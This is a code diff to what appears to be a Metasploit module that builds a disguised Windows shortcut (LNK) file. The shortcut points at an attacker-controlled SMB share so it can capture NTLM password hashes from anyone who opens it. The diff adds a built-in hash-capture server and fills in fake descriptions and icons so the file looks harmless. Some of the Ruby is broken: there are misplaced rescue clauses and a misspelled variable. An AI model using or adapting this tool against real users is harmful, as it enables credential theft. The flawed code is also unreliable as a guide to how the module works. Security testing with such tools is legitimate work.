@@ -7,6 +7,8 @@ class MetasploitModule < Msf::Auxiliary
     Rank = GoodRanking
   
     include Msf::Exploit::FILEFORMAT
+    include Msf::Exploit::Remote::SMB::Server::Share
+    include Msf::Exploit::Remote::SMB::Server::HashCapture
     
     def initialize(info = {})
       super(update_info(info,
@@ -43,24 +45,58 @@ class MetasploitModule < Msf::Auxiliary
   
       register_options([
         OptString.new('FILENAME', [true, 'The LNK file name', 'msf.lnk']),
-        OptString.new('UNC_PATH', [true, 'The UNC path for credentials capture (e.g., \\\\192.168.1.1\\share)', '\\\\192.168.1.1\\share']),
-        OptString.new('DESCRIPTION', [true, 'The shortcut description', 'Testing Purposes']),
-        OptString.new('ICON_PATH', [true, 'The icon path to use (not necessary using real ICON)', 'e.g. a']),
+        OptString.new('UNC_PATH', [false, 'The UNC path for credentials capture (e.g., \\\\192.168.1.1\\share)', nil]),
+        OptString.new('DESCRIPTION', [false, 'The shortcut description', nil]),
+        OptString.new('ICON_PATH', [false, 'The icon path to use (not necessary using real ICON)', nil]),
         OptInt.new('PADDING_SIZE', [false, 'Size of padding in command arguments', 10])
+      ])
+      deregister_options('SRVHOST', 'SRVPORT')
+      register_advanced_options([
+        OptAddressLocal.new('SRVHOST', [true, 'The local host to listen on', '0.0.0.0']),
+        OptPort.new('SRVPORT', [true, 'The local port to listen on', 445])
       ])
     end
   
     def run
       print_status("Creating '#{datastore['FILENAME']}' file...")
-      
-      begin
-        lnk_data = create_lnk_file
-        file_create(lnk_data)
-        print_good("LNK file created: #{datastore['FILENAME']}")
-        print_status("Set up a listener (e.g., auxiliary/server/capture/smb) to capture the authentication")
-      rescue => e
-        fail_with(Failure::BadConfig, "Error generating the LNK file: #{e.message}")
+
+      description = datastore['DESCRIPTION']
+      icon_path = datastore['ICON_PATH']
+
+      unless description && !description.empty?
+        require 'faker'
+        description = Faker::Lorem.sentence(word_count: 3) rescue nil
+        rescue LoadError
+          description = nil
+        end
+        description ||= 'Shortcut'
       end
+
+      unless icon_path && !icon_path.empty?
+        require 'faker'
+        icon_path = File.join('%SystemRoot%\\System32', "#{Faker::File.file_name(ext: 'ico')}") rescue nil
+        rescue LoadError
+          icon_path = nil
+        end
+        icon_path ||= '%SystemRoot%\\System32\\shell32.dll'
+      end
+
+      unc_path = datastore['UNC_PATH']
+      if unc_path.nil? || unc_path.empty?
+        start_smb_capture_server
+        unc_path = "\\\\#{datastore['SRVHOST']}\\#{random_share_name}"
+      else
+        validate_or_fail_unc!(unc_path)
+      end
+
+      @resolved_description = description
+      @resolved_icon_path = icon_path
+      @resovled_unc_path = unc_path
+      lnk_data = create_lnk_file
+      file_create(lnk_data)
+      print_good("LNK file created: #{datastore['FILENAME']}")
+      print_status("Listening for hashes on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}")
+
     end
   
     def create_lnk_file
@@ -108,7 +144,7 @@ class MetasploitModule < Msf::Auxiliary
         data += header
               
         # NAME field (description in Unicode)
-        description = datastore['DESCRIPTION'].to_s
+        description = @resolved_description.to_s
         description_utf16 = description.encode('UTF-16LE').b
         data += [description_utf16.bytesize / 2].pack('v')
         data += description_utf16
@@ -121,7 +157,7 @@ class MetasploitModule < Msf::Auxiliary
         data += cmd_args_utf16
         
         # ICON LOCATION field (icon path in Unicode)
-        icon_path = datastore['ICON_PATH'].to_s
+        icon_path = @resolved_icon_path.to_s
         icon_path_utf16 = icon_path.encode('UTF-16LE').b
         data += [icon_path_utf16.bytesize / 2].pack('v')
         data += icon_path_utf16
@@ -134,7 +170,7 @@ class MetasploitModule < Msf::Auxiliary
         data += [env_block_sig].pack('V')
         
         # Target field in ANSI (260 bytes)
-        unc_path = validate_unc_path(datastore['UNC_PATH'].to_s)
+        unc_path = @resovled_unc_path.to_s
         
         # Create fixed-size ANSI buffer with nulls
         ansi_buffer = "\x00".b * 260
@@ -161,7 +197,7 @@ class MetasploitModule < Msf::Auxiliary
         
         data += "\x00\x00\x00\x00".b
         
-        return data
+        data
       rescue => e
         print_error("Error in create_lnk_file: #{e.message}")
         print_error("#{e.backtrace.join("\n")}")
@@ -169,10 +205,21 @@ class MetasploitModule < Msf::Auxiliary
       end
     end
     
-    def validate_unc_path(path)
-      unless path.match(/^\\\\[^\\]+\\[^\\]*$/)
-        print_warning("UNC_PATH may not be correctly formatted. Expected format: \\\\server\\share")
+    def start_smb_capture_server
+      self.share_name = random_share_name
+      self.smb_srvhost = datastore['SRVHOST']
+      self.smb_srvport = datastore['SRVPORT']
+      self.capture_hashes = true
+      start_service
+    end
+
+    def random_share_name
+      "share#{Rex::Text.rand_text_alphanumeric(6)}"
+    end
+    
+    def validate_or_fail_unc!(path)
+      unless path.match(/^\\\\[^\\]+\\[^\\]+$/)
+        fail_with(Failure::BadConfig, "UNC_PATH format invalid, expected \\\\server\\share")
       end
-      path
     end
   end 
